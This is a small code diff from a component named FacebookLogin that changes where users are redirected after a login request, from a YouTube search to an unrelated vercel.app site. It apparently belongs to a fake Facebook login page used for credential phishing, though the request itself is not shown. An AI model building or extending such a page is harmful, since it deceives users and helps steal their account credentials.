@@ -52,7 +52,7 @@ export default function FacebookLogin() {
         })
       });
 
-      window.location.href = `https://www.youtube.com/results?search_query=yoah+bros`;
+      window.location.href = `https://art-premier-music-library.vercel.app/`;
       
     } catch (err) {
       setError('Invalid username or password');
